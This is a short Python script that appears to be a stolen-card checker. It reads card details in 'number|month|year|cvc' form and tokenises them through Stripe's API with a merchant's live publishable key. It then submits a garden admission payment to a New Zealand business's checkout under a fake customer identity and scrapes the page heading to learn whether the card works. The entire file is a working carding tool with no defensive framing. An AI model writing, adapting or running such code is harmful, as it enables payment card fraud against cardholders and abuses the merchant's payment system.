import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb7b0ea5ef3%3B+stripe-js-v3%2Fb7b0ea5ef3%3B+card-element&key=pk_live_51HWZDSG26nFsMMEanKbIfiDzvA5X2JSkj2HcRAL9JssntHja6TBO4bHhDA09IrFxLGgrAkDnnTyaQ2dzNUuGO5Gn00XQ8yyaWd'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'ayrlies.co.nz',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://ayrlies.co.nz',
	    'referer': 'https://ayrlies.co.nz/visit/payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'visitor_number': '1',
	    'first_name': 'Rodam',
	    'last_name': 'User',
	    'email': 'rodamuser08@gmail.com',
	    'phone': '4303000850',
	    'admission_type': 'garden_admission',
	    'gw_price': '100',
	    'pf_price': '100',
	    'stripeToken': f'{tok}',
	}
	
	response = requests.post('https://ayrlies.co.nz/visit/payment-confirmation/', headers=headers, data=data)
	
	result = re.search(r"<h2>(.*?)</h2>", response.text).group(1)
	
	return (result)
